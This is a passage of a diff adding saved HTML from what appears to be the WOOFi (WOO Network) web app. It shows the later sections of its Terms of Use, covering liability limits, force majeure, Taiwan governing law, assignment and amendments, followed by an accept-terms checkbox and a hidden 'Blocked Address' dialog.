+                      <p data-v-6234d9e5="">YOU EXPRESSLY UNDERSTAND AND AGREE THAT WOO NETWORK ECOSYSTEM AND OUR
+                        AFFILIATES AND SERVICE PROVIDERS, AND THEIR RESPECTIVE OFFICERS, DIRECTORS, AGENTS, JOINT
+                        VENTURERS, EMPLOYEES, AND REPRESENTATIVES WILL NOT BE LIABLE FOR ANY INDIRECT, INCIDENTAL,
+                        SPECIAL, CONSEQUENTIAL, EXEMPLARY DAMAGES, OR DAMAGES FOR LOSS OF PROFITS INCLUDING WITHOUT
+                        LIMITATION DAMAGES FOR LOSS OF GOODWILL, USE, DATA, OR OTHER INTANGIBLE LOSSES (EVEN IF WOO
+                        NETWORK ECOSYSTEM HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES), WHETHER BASED ON
+                        CONTRACT, TORT, NEGLIGENCE, OR OTHERWISE, RESULTING FROM: (I) THE USE OR THE INABILITY TO USE
+                        THE SERVICES; (II) THE COST OF PROCUREMENT OF SUBSTITUTE GOODS AND SERVICES RESULTING FROM ANY
+                        GOODS, DATA, INFORMATION, OR SERVICES PURCHASED OR OBTAINED OR MESSAGES RECEIVED OR TRANSACTIONS
+                        ENTERED INTO THROUGH OR FROM THE SERVICES; (III) UNAUTHORIZED ACCESS TO OR ALTERATION OF YOUR
+                        TRANSMISSIONS OR DATA; OR (IV) ANY OTHER MATTER RELATING TO THE SERVICES.</p>
+                      <p data-v-6234d9e5="">IN NO EVENT WILL THE AGGREGATE LIABILITY OF WOO NETWORK ECOSYSTEM, ITS
+                        AFFILIATES AND THEIR RESPECTIVE SHAREHOLDERS, MEMBERS, DIRECTORS, OFFICERS, EMPLOYEES,
+                        ATTORNEYS, AGENTS, REPRESENTATIVES, SUPPLIERS OR CONTRACTORS ARISING OUT OF SERVICES OFFERED BY
+                        OR ON BEHALF OF WOO NETWORK ECOSYSTEM AND ITS AFFILIATES, ANY PERFORMANCE OR NON-PERFORMANCE OF
+                        WOO NETWORK ECOSYSTEM SERVICES, OR ANY OTHER PRODUCT, SERVICE OR OTHER ITEM, WHETHER UNDER
+                        CONTRACT, STATUTE, STRICT LIABILITY OR OTHER THEORY, EXCEED THE AMOUNT OF THE FEES PAID BY YOU
+                        TO WOO NETWORK ECOSYSTEM UNDER THESE TERMS IN THE TWELVE-MONTH PERIOD IMMEDIATELY PRECEDING THE
+                        EVENT GIVING RISE TO THE CLAIM FOR LIABILITY.</p>
+                      <p data-v-6234d9e5="">SOME JURISDICTIONS DO NOT ALLOW THE EXCLUSION OF CERTAIN WARRANTIES OR THE
+                        LIMITATION OR EXCLUSION OF LIABILITY FOR INCIDENTAL OR CONSEQUENTIAL DAMAGES. ACCORDINGLY, SOME
+                        OF THE LIMITATIONS SET FORTH ABOVE MAY NOT APPLY TO YOU. IF YOU ARE DISSATISFIED WITH ANY
+                        PORTION OF THE SERVICES OR WITH THIS AGREEMENT, YOUR SOLE AND EXCLUSIVE REMEDY IS TO DISCONTINUE
+                        USE OF THE SERVICES. THE SERVICES ARE PROVIDED “AS IS” AND WITHOUT ANY REPRESENTATION OR
+                        WARRANTY, WHETHER EXPRESS OR IMPLIED. WOO NETWORK ECOSYSTEM, OUR AFFILIATES, AND OUR RESPECTIVE
+                        OFFICERS, DIRECTORS, AGENTS, JOINT VENTURERS, EMPLOYEES, AND SUPPLIERS SPECIFICALLY DISCLAIM ANY
+                        IMPLIED WARRANTIES OF TITLE, MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE OR
+                        NON-INFRINGEMENT. WOO NETWORK ECOSYSTEM MAKES NO WARRANTY THAT (I) THE SERVICES WILL MEET YOUR
+                        REQUIREMENTS, (II) THE SERVICES WILL BE UNINTERRUPTED, TIMELY, SECURE, OR ERROR-FREE, OR (III)
+                        THE QUALITY OF ANY PRODUCTS, SERVICES, INFORMATION, OR OTHER MATERIAL PURCHASED OR OBTAINED BY
+                        YOU WILL MEET YOUR EXPECTATIONS.</p>
+                      <h3 data-v-6234d9e5="">12. FORCE MAJEURE</h3>
+                      <p data-v-6234d9e5="">WOO Network Ecosystem shall have no liability for any failure or delay
+                        resulting from any abnormal or unforeseeable circumstances outside our reasonable control, the
+                        consequences of which would have been unavoidable despite all efforts to the contrary, including
+                        without limitation governmental action or acts of terrorism, earthquake, fire, typhoons, floods,
+                        wars, hacker attacks, computer virus invasions, or regulatory changes which render this
+                        Agreement unlawful, or other acts of God, labor conditions, delays or failures caused by
+                        problems with another system or network, mechanical breakdown or data-processing failures or
+                        where we are bound by other legal obligations.</p>
+                      <h3 data-v-6234d9e5="">13. GOVERNING LAW; VENUE</h3>
+                      <p data-v-6234d9e5="">The laws of Taiwan shall govern these Terms. Except as otherwise required by
+                        local law, any dispute between you and WOO Network Ecosystem related in any way to, or arising
+                        in any way from, our Services or these Terms (“Dispute”) shall be finally settled in the legal
+                        proceeding of Taipei District Court. Any litigations shall take place in Taipei.</p>
+                      <h3 data-v-6234d9e5="">14. ASSIGNMENT</h3>
+                      <p data-v-6234d9e5="">You may not transfer or assign these Terms or any rights or obligations you
+                        have under these Terms without our prior written consent or otherwise and any such attempted
+                        assignment shall be void. We reserve the right to freely assign or transfer these Terms and the
+                        rights and obligations of these Terms, to any third party at any time without notice or consent.
+                        If you object to such transfer or assignment, you may stop using our services and terminate this
+                        agreement.</p>
+                      <h3 data-v-6234d9e5="">15. THIRD PARTY CONTENT</h3>
+                      <p data-v-6234d9e5="">We strives to provide accurate and reliable information and content on
+                        WOOFi, but such information may not always be correct, complete, or up to date. We will update
+                        the information on WOOFi as necessary to provide you with the most up to date information, but
+                        you should always independently verify such information. WOOFi may also contain links to third
+                        party websites, applications, events or other materials (“Third Party Content”). Such
+                        information is provided for your convenience and links or references to Third Party Content do
+                        not constitute an endorsement by our products or services. We shall have no liability for any
+                        losses incurred as a result of actions taken in reliance on the information contained on WOOFi
+                        or in any Third Party Content.</p>
+                      <h3 data-v-6234d9e5="">16. AMENDMENTS</h3>
+                      <p data-v-6234d9e5="">We may amend any portion of these Terms at any time by posting the revised
+                        version of these Terms with an updated revision date. The changes will become effective, and
+                        shall be deemed accepted by you, the first time you use our services after the initial posting
+                        of the revised agreement and shall apply on a going-forward basis with respect to transactions
+                        initiated after the posting date. In the event that you do not agree with any such modification,
+                        your sole and exclusive remedy is to terminate your use of WOOFi. You agree that we shall not be
+                        liable to you or any third party as a result of any losses suffered by any modification or
+                        amendment of these Terms.</p>
+                      <h3 data-v-6234d9e5="">17. ENTIRE AGREEMENT</h3>
+                      <p data-v-6234d9e5="">The failure of WOO Network Ecosystem to exercise or enforce any right or
+                        provision of the Agreement shall not constitute a waiver of such right or provision. If any
+                        provision of these Terms shall be adjudged by any court of competent jurisdiction to be
+                        unenforceable or invalid, that provision shall be limited or eliminated to the minimum extent
+                        necessary so that these Terms shall otherwise remain in full force and effect and remain
+                        enforceable between the parties. The headings and any explanatory text are for reference
+                        purposes only and in no way define, limit, construe, or describe the scope or extent of such
+                        section. These Terms, including WOO Network Ecosystem’s policies governing our services,
+                        constitute the entire agreement between you and WOO Network Ecosystem with respect to the use of
+                        our services.</p>
+                      <div data-v-6234d9e5="" id="tou-finish" bis_skin_checked="1"></div>
+                    </div>
+                    <div data-v-6234d9e5="" class="operation" bis_skin_checked="1">
+                      <div data-v-6234d9e5="" class="check" bis_skin_checked="1"><label data-v-6234d9e5=""
+                          class="el-checkbox is-checked"><span class="el-checkbox__input is-checked"><span
+                              class="el-checkbox__inner"></span><input type="checkbox" aria-hidden="false"
+                              class="el-checkbox__original" value=""></span><span class="el-checkbox__label"><span
+                              data-v-6234d9e5="">I read and accept the</span><i data-v-6234d9e5="">Terms of
+                              Use</i><!----></span></label></div>
+                      <div data-v-6234d9e5="" class="btn" bis_skin_checked="1"><button data-v-6234d9e5="" type="button"
+                          class="el-button el-button--primary"><!----><!----><span>Continue</span></button></div>
+                    </div>
+                  </div><!---->
+                </div>
+              </div>
+            </div>
+            <div data-v-6e3e9fc8="" data-v-2fd23e10="" class="tous" bis_skin_checked="1">
+              <div data-v-6e3e9fc8="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                <div role="dialog" aria-modal="true" aria-label="Blocked Address" class="el-dialog" bis_skin_checked="1"
+                  style="margin-top: 15vh; width: 670px;">
+                  <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Blocked
+                      Address</span><!----></div><!----><!---->
+                </div>
+              </div>
+            </div>
+          </div>
+        </div> <!---->
+      </div>
+    </div>
+  </div>
+</body>
+</html>
